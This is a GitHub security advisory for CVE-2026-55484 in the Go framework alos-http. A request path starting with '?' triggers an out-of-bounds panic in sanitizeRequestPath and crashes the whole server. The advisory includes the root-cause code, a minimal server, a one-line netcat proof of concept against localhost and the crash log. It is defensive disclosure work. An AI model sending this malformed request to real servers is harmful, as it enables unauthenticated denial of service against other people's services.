# [H] alos-http has unauthenticated remote DoS: malformed path starting with "?" triggers out-of-bounds panic in sanitizeRequestPath, crashing entire server

## Summary
Severity: High
Advisory: GHSA-hr6j-w4mw-g9mj
CVE: CVE-2026-55484
CWE: CWE-248, CWE-754
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-08-28
Source: https://github.com/advisories/GHSA-hr6j-w4mw-g9mj
Type: github-advisory

## Affected
- Go: `github.com/guno1928/alos-http` — affected >=0 <0.0.0-20260617230736-314b6783e196

## Details
### Summary
A single unauthenticated HTTP request to a path starting with `?` (e.g. `GET ? HTTP/1.1`) crashes the entire server process.
The request line parser passes the path to `sanitizeRequestPath` which indexes the first byte of the path after stripping the query string. It does so without checking that it is non-empty, leading to an out-of-bounds panic. The panic occurs before any handler or middleware runs so `core.Recovery()` does not recover it. The entire process panics and every connection is dropped. It is reachable over HTTP/1.1, HTTP/2 and HTTP/3 if `ListenAndServeQUIC` is enabled

### Details
**root cause**: `core/utils.go::sanitizeRequestPath`
```go
// assume path := "?"
if len(path) == 0 { // len(path) == 1
	return "/"
}

p, _ := splitPathQuery(path) // p == ""

if p[0] == '/' /*...*/ { // p[0] on empty string => panic: index out of range
	return p
}
```

* when the path starts with "?" len(path) is not 0 so the early return does not fire
* after `splitPathQuery` `p` is empty `""`
* `p` is then indexed `p[0]` without a length check

Relevant calling sites:

* `h1_plain.go:ParseH1RequestHead` (HTTP/1.1)
* `h1.go::ParseH1Request` (dead code)
* `hpack.go::decodeSimpleGetPathHTTPSRequest` (HTTP/2)
* `hpack.go::observeHeader` (HTTP/2)
* `h3_conn.go::handleRequestStream` (HTTP/3)

these run in the connection-worker goroutine before the handler chain, which has no recover(), causing the entire http server to crash in case of a panic

### PoC

Minimal server, using [the quick-start](https://github.com/guno1928/alos-http#quick-start)

```go
srv := core.New(core.Config{Addr: ":8080", PlainHTTP: true})
srv.Router.Use(core.Recovery()) // is unable to catch a parser panic
srv.Router.GET("/", func(req *core.Request, resp *core.Response) { resp.Status(200).String("not crashed (yet)") })
log.Fatal(srv.ListenAndServe())
```

Crash it with a single request

```bash
printf 'GET ? HTTP/1.1\r\nHost: x\r\n\r\n' | nc 127.0.0.1 8080
```

Server output & crash

```log
2026/06/11 20:52:52 listening on http://localhost:8080
2026/06/11 20:52:52 [INFO] capabilities: linux/amd64 cpu=8 gomaxprocs=8 workers=8 aes-ni=true ktls-ulp=false nic=eth0 ktls-hw-offload=false => use-ktls=false
2026/06/11 20:52:52 [INFO] raised RLIMIT_NOFILE soft limit to 1048576 (hard=1048576)
2026/06/11 20:52:52 === ALOS HTTP Server (Plain HTTP/1.1 + HTTP/2 prior knowledge) ===
2026/06/11 20:52:52 Listening on http://:8080 (8 listener(s))
2026/06/11 20:52:52 [INFO] io_uring plain worker mode active on Linux amd64: workers=8 accept-shards=8 initial-conn-pool=1600
panic: runtime error: index out of range [0] with length 0

goroutine 34 [running]:
github.com/guno1928/alos-http/core.sanitizeRequestPath({0xa4aec31a004, 0x1})
        /home/baloo/alos-http/core/utils.go:566 +0x64a
github.com/guno1928/alos-http/core.ParseH1RequestHead({0xa4aec31a000, 0x1b, 0x2000}, 0xa4ae6c80098)
        /home/baloo/alos-http/core/h1_plain.go:474 +0x48c
github.com/guno1928/alos-http/core.(*plainUringWorker).processRequests(0xa4ae6f00008, 0xa4ae6c80000)
        /home/baloo/alos-http/core/uring_plain_workers_linux_amd64.go:618 +0x1db
github.com/guno1928/alos-http/core.(*plainUringWorker).handleBufferedRead(0xa4ae6f00008, 0xa4ae6c80000, 0x0?, 0x3, 0xa4aec406d00?)
        /home/baloo/alos-http/core/uring_plain_workers_linux_amd64.go:572 +0x365
github.com/guno1928/alos-http/core.(*plainUringWorker).handleRead(0x0?, 0xa4aec406d00?, 0x489bcd?, 0x0?, 0x22ecdd3b63a?)
        /home/baloo/alos-http/core/uring_plain_workers_linux_amd64.go:510 +0x25
github.com/guno1928/alos-http/core.(*plainUringWorker).handleCompletion(0xa4ae6f00008?, 0xa4ae6f00068?, {0x0?, 0x0?, 0x0?}, 0x0?)
        /home/baloo/alos-http/core/uring_plain_workers_linux_amd64.go:453 +0x185
github.com/guno1928/alos-http/core.(*plainUringWorker).run(0xa4ae6f00008, 0xa4ae686f000)
        /home/baloo/alos-http/core/uring_plain_workers_linux_amd64.go:373 +0x72a
github.com/guno1928/alos-http/core.(*plainUringBackend).start.func1()
        /home/baloo/alos-http/core/uring_plain_workers_linux_amd64.go:190 +0x69
created by github.com/guno1928/alos-http/core.(*plainUringBackend).start in goroutine 1
        /home/baloo/alos-http/core/uring_plain_workers_linux_amd64.go:188 +0x3a
exit status 2
```

all subsequent requests now fail, since the server is down

### Impact

Unauthenticated remote single-request denial of service. Any client that can reach the server can crash it with one trivial malformed request.
Repeating this process keeps the service offline. 
There is no loss of confidentiality or integrity. Only availability. Since HTTP/1.1 and HTTP/2 are served by default this affects effectively all deployments of the framework, unless shielded by third parties (e.g. reverse proxies like nginx)

## References
- https://github.com/guno1928/alos-http/security/advisories/GHSA-hr6j-w4mw-g9mj
- https://github.com/guno1928/alos-http/commit/314b6783e19698c85ea9d9b197ff52f7f6a3a374
- https://github.com/guno1928/alos-http
